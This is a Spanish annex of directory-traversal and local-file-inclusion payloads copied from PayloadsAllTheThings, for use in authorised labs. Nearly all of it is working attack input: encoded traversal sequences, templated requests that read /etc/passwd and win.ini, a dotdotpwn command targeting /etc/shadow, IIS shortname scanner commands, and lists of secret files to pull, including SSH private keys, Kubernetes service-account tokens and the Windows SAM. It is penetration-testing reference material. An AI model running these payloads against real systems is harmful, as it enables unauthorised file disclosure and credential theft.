# Path Traversal y LFI: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Directory Traversal/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Directory%20Traversal/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Recorrido de directorios / Herramientas

```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
```

## 2. Recorrido de directorios / Metodología

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### Variantes presentes en tablas o texto del apartado

```text
..
```

## 3. Metodología / Codificación URL

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### Variantes presentes en tablas o texto del apartado

```text
.
%2e
/
%2f
\
%5c
```

## 4. Metodología / Doble Codificación URL

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### Variantes presentes en tablas o texto del apartado

```text
.
%252e
/
%252f
\
%255c
```

## 5. Metodología / Codificación Unicode

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### Variantes presentes en tablas o texto del apartado

```text
.
%u002e
/
%u2215
\
%u2216
```

## 6. Metodología / Overlong UTF-8 Codificación Unicode

### Variantes presentes en tablas o texto del apartado

```text
.
%c0%2e
%e0%40%ae
%c0%ae
/
%c0%af
%e0%80%af
%c0%2f
\
%c0%5c
%c0%80%5c
```

## 7. Metodología / Rutas alteradas

```powershell
..././
...\.\
```

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

### Variantes presentes en tablas o texto del apartado

```text
../
```

## 8. Metodología / Bytes nulos

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### Variantes presentes en tablas o texto del apartado

```text
%00
```

## 9. Metodología / Diferencias de URL en proxy inverso

```powershell
..;/
```

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```

### Variantes presentes en tablas o texto del apartado

```text
/..;/
/../
```

## 10. Explotación / Recurso compartido UNC

```powershell
\\localhost\c$\windows\win.ini
```

### Variantes presentes en tablas o texto del apartado

```text
\\UNC\share\name
```

## 11. Explotación / ASP.NET sin Cookies

```ps1
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
```

```ps1
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
```

### Variantes presentes en tablas o texto del apartado

```text
http://example.com/page.aspx
http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx
(S(...))
```

## 12. Explotación / Nombres cortos de IIS

```ps1
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
```

```ps1
    shortscan http://example.org/
```

## 13. Explotación / Protocolo URL de Java

```powershell
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

### Variantes presentes en tablas o texto del apartado

```text
new URL('')
url:URL
```

## 14. Recorrido de rutas / Archivos Linux

```powershell
    /etc/issue
    /etc/group
    /etc/hosts
    /etc/motd
```

```ps1
    /proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor
    /proc/self/environ
    /proc/version
    /proc/cmdline
    /proc/sched_debug
    /proc/mounts
```

```ps1
    /proc/net/arp
    /proc/net/route
    /proc/net/tcp
    /proc/net/udp
```

```ps1
    /proc/self/cwd/index.php
    /proc/self/cwd/main.py
```

```ps1
    /var/lib/mlocate/mlocate.db
    /var/lib/plocate/plocate.db
    /var/lib/mlocate.db
```

```ps1
    /etc/passwd
    /etc/shadow
    /home/$USER/.bash_history
    /home/$USER/.ssh/id_rsa
    /etc/mysql/my.cnf
```

```ps1
    /run/secrets/kubernetes.io/serviceaccount/token
    /run/secrets/kubernetes.io/serviceaccount/namespace
    /run/secrets/kubernetes.io/serviceaccount/certificate
    /var/run/secrets/kubernetes.io/serviceaccount
```

## 15. Recorrido de rutas / Archivos Windows

```powershell
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

```powershell
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```

### Variantes presentes en tablas o texto del apartado

```text
license.rtf
win.ini
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
